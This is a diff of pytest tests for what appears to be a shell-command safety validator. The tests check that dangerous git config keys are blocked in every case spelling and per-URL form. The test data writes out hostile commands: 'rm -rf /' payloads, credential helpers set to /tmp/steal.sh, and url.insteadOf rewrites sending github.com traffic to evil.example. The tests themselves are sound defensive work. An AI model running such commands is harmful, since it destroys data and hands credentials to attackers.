@@ -6,6 +6,7 @@ from schlock.core import validator as val_module
 from schlock.core.parser import _reads_stdin_as_program
 from schlock.core.rules import RiskLevel
 from schlock.core.substitution import (
+    _DANGEROUS_GIT_CONFIGS,
     dangerous_find,
     dangerous_git_config,
     dangerous_kubectl,
@@ -548,6 +549,109 @@ class TestGitConfigWriteVerdicts:
     def test_injected_form_still_denied(self):
         # The -c path this fix is the persisted twin of must not regress.
         assert validate_command("git -c core.pager='rm -rf /' log").risk_level == RiskLevel.BLOCKED
+
+
+# The eleven non-alias exec keys. `alias.` is a prefix entry with no <name> segment to match on.
+_EXEC_KEYS = sorted(k for k in _DANGEROUS_GIT_CONFIGS if k != "alias.")
+
+
+class TestGitConfigKeyGrammar:
+    """git keys are `<section>[.<subsection>].<name>`: section and name are case-insensitive, and
+    the subsection is free text that may itself hold dots (`credential.https://github.com.helper`).
+    A key test that is a literal lowercase prefix misses both the per-URL form and nothing else,
+    so these pin the grammar at BOTH call sites the test is shared by (LAB-4283)."""
+
+    @pytest.mark.parametrize("key", _EXEC_KEYS)
+    def test_every_exec_key_still_matches_plain_and_capitalised(self, key):
+        # AC-4: widening the shared key test must not lose any existing key, at either site.
+        for spelling in (key, key.upper(), key.title()):
+            assert dangerous_git_config(["-c", f"{spelling}=/tmp/evil", "status"]) is not None
+            assert git_config_exec_payload(["config", spelling, "rm -rf /"]) == "rm -rf /"
+
+    @pytest.mark.parametrize("key", _EXEC_KEYS)
+    def test_every_exec_key_matches_with_a_subsection(self, key):
+        section, name = key.split(".")
+        per_url = f"{section.title()}.https://x.example/a.b.{name.upper()}"
+        assert dangerous_git_config(["-c", f"{per_url}=/tmp/evil", "status"]) is not None
+        assert git_config_exec_payload(["config", per_url, "rm -rf /"]) == "rm -rf /"
+
+    def test_real_subsection_forms_are_caught(self):
+        # The per-URL credential helper and the per-format signing programs are documented git
+        # keys that run a program; all four read SAFE on the literal prefix test.
+        assert dangerous_git_config(["-c", "credential.https://x.helper=/tmp/steal.sh", "fetch"]) is not None
+        assert dangerous_git_config(["-c", "gpg.ssh.program=/tmp/evil", "commit", "-S"]) is not None
+        assert git_config_exec_payload(["config", "gpg.x509.program", "rm -rf /"]) == "rm -rf /"
+        assert git_config_exec_payload(["config", "Credential.https://x.Helper", "rm -rf /"]) == "rm -rf /"
+
+    def test_same_name_in_another_section_does_not_match(self):
+        # Only section AND name identify a key: `color.pager` is a boolean colour switch, not
+        # core.pager, and a credential username is not a helper.
+        assert dangerous_git_config(["-c", "color.pager=/tmp/evil", "log"]) is None
+        assert dangerous_git_config(["-c", "credential.https://x.username=me", "fetch"]) is None
+        assert git_config_exec_payload(["config", "pager.log", "rm -rf /"]) is None
+        assert git_config_exec_payload(["config", "credential.https://x.username", "rm -rf /"]) is None
+
+    def test_credential_helper_payload_strips_the_bang(self):
+        # gitcredentials(7): a helper starting with `!` is run as a shell command, exactly like a
+        # `!` alias, so the payload is what follows the `!`.
+        assert git_config_exec_payload(["config", "credential.helper", "!rm -rf /"]) == "rm -rf /"
+        assert git_config_exec_payload(["config", "credential.https://x.helper", " ! rm -rf /"]) == "rm -rf /"
+
+    def test_credential_helper_without_bang_is_still_a_payload(self):
+        # Unlike an alias, a helper with no `!` still runs a program (`git credential-<v>` or the
+        # path itself), so the raw value is returned rather than None.
+        assert git_config_exec_payload(["config", "credential.helper", "/opt/steal.sh"]) == "/opt/steal.sh"
+        assert git_config_exec_payload(["config", "credential.helper", "store"]) == "store"
+
+
+@pytest.mark.usefixtures("no_shellcheck_underblocks")
+class TestCredentialConfigVerdicts:
+    """A credential-config write is judged the same whatever its case, and the per-URL spelling
+    like the plain one (LAB-4283)."""
+
+    # AC-1. git folds section and name case, so every one of these is a live write.
+    DENIED = [
+        "git config --global credential.helper /tmp/steal.sh",
+        "git config --global Credential.Helper /tmp/steal.sh",
+        "git config --global 'Credential.https://github.com.Helper' /tmp/steal.sh",
+        "git config --global 'Url.https://evil.example/.InsteadOf' https://github.com/",
+        "git config --global CREDENTIAL.HELPER /tmp/steal.sh",
+        "git config --global url.https://evil.example/.INSTEADOF https://github.com/",
+        "git config --global Url.https://evil.example/.PushInsteadOf https://github.com/",
+        "git -c Credential.https://x.Helper=/tmp/steal.sh fetch",
+    ]
+
+    @pytest.mark.parametrize("command", DENIED)
+    def test_denied_whatever_the_case(self, command):
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED
+        assert not result.allowed
+
+    @pytest.mark.parametrize("command", DENIED)
+    def test_denied_in_a_substitution(self, command):
+        assert validate_command(f'echo "$({command})"').risk_level == RiskLevel.BLOCKED
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git config --global credential.helper store",
+            "git config --global credential.helper 'cache --timeout=3600'",
+        ],
+    )
+    def test_ordinary_helper_setup_stays_blocked(self, command):
+        # AC-2, decided BLOCKED. A helper is not judged like core.pager (by the payload's own
+        # verdict): its job is to RECEIVE plaintext credentials, so its danger is where they go,
+        # which no command verdict sees - `/tmp/steal.sh` is SAFE as a bare command. Nor are the
+        # in-tree names safe by name: `store --file /tmp/x` writes every credential to a path of
+        # the caller's choosing, and `cache --socket` likewise. An allow-list by helper name would
+        # be the bypass. A human sets a helper once, and a user-level whitelist entry covers it.
+        assert validate_command(command).risk_level == RiskLevel.BLOCKED
+
+    def test_per_url_helper_is_judged_like_the_plain_one(self):
+        # AC-3.
+        plain = validate_command("git config --global credential.helper manager")
+        per_url = validate_command("git config --global 'credential.https://github.com.helper' manager")
+        assert per_url.risk_level == plain.risk_level == RiskLevel.BLOCKED
 
 
 class TestWhitelistedPrefixDoesNotCoverTheRestOfTheLine:
